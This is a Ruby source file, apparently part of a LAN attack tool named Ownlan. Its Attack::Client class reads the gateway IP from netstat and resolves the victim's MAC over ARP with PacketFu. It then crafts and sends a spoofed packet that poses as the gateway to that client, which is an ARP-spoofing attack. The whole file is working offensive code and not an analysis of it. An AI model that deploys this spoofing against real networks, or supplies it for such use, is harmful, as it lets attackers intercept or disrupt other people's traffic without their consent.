module Ownlan
  module Attack
    class Client < Base

      def process
        gw_ip = `netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0"`
        client_mac = PacketFu::Utils::arp(config.client_ip, :iface => config.interface)

        config.source_mac.nil? ? saddr = ServiceObjects::self_mac(config.interface) : saddr = config.source_mac
        daddr = client_mac
        saddr_ip = gw_ip
        daddr_ip = config.client_ip
        crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, daddr_ip, config.delay, config.interface)
        send_packet(config.delay, config.interface, crafted_packet)
      end
    end
  end
end